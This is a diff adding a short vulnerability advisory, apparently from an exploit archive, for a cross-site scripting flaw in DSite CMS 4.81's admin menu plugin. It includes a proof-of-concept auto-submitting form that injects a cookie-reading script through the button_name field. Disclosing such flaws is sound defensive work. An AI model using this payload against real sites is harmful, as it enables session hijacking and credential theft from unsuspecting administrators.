@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/41724/info
+
+DSite CMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+DSite CMS 4.81 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/admin/plugin.php?menu_id=1&module=menu&plitem=modmenu.php" method="post" name="main" >
+<input type="hidden" name="module" value="menu" />
+<input type="hidden" name="plitem" value="modmenu.php" />
+<input type="hidden" name="menu_id" value="1" />
+<input type="hidden" name="button_name" value='bn"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="new_make" value="YES" />
+</form>
+<script>
+document.main.submit();
+</script>
